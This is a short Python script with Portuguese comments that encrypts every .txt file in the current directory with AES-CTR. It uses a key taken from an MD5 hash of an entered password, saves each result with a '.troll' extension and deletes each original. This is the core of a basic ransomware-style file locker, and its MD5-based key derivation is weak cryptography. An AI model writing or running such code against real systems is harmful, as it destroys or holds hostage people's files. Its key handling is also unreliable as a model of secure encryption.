#nota pessoal: odeio python, muito ruim, mesmo....
import os
import pyaes
import hashlib

# Definir a senha
senha = input("Insira a senha: ")

# Gerar o hash MD5 e pegar os primeiros 16 caracteres
hash_md5 = hashlib.md5(senha.encode()).hexdigest()
chave = hash_md5[:16].encode()

def criptografar_arquivo(file_name):
    try:
        with open(file_name, "rb") as file:
            file_data = file.read()
        
        # Inicializar AES com a chave gerada
        aes = pyaes.AESModeOfOperationCTR(chave)
        crypto_data = aes.encrypt(file_data)
        
        # Criar o arquivo criptografado
        new_file_name = file_name + ".troll"
        with open(new_file_name, "wb") as new_file:
            new_file.write(crypto_data)
        
        # Remover o arquivo original
        os.remove(file_name)
        print(f"Arquivo {file_name} criptografado com sucesso para {new_file_name}.")
    except Exception as e:
        print(f"Erro ao criptografar {file_name}: {e}")

# Percorrer todos os arquivos no diretório
for arquivo in os.listdir():
    if arquivo.endswith(".txt"):
        criptografar_arquivo(arquivo)

print("Processo concluído.")
